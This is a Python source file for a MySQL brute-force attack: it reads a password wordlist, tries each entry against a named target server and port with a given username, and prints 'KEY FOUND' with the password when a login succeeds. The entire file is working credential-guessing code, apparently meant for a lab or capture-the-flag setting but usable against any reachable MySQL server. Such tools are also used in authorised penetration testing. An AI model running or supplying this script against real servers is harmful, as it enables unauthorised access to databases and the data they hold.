import argparse
import mysql.connector
from mysql.connector import Error

def try_login(host, port, username, password):
    """
    Attempt to log in to the MySQL server using the provided credentials.

    :param host: MySQL server IP or hostname
    :param port: MySQL server port
    :param username: Username to authenticate with
    :param password: Password to authenticate with
    :return: True if login is successful, False otherwise
    """
    try:
        connection = mysql.connector.connect(
            host=host,
            port=port,
            user=username,
            password=password
        )
        if connection.is_connected():
            print(f"KEY FOUND [{password}]")
            connection.close()
            return True
    except Error:
        return False

def main():
    """
    Main function to parse arguments and initiate brute-force attack.
    """
    parser = argparse.ArgumentParser(description="MySQL Brute Force Script")
    parser.add_argument("-l", "--username", required=True, help="Username for MySQL server")
    parser.add_argument("-P", "--password-file", required=True, help="Path to password file")
    parser.add_argument("target", help="MySQL server target (e.g., mysql:<IP>)")
    parser.add_argument("port", type=int, help="Port of MySQL server")

    args = parser.parse_args()

    username = args.username
    password_file = args.password_file
    target = args.target.replace("mysql:", "")
    port = args.port

    try:
        # Read passwords from file
        with open(password_file, "r") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"Password file '{password_file}' not found.")
        return

    print(f"Starting attack on MySQL server at {target}:{port} with username '{username}'")

    for password in passwords:
        print(f"Trying password: {password}")
        if try_login(target, port, username, password):
            break
    else:
        print("KEY NOT FOUND")

if __name__ == "__main__":
    main()
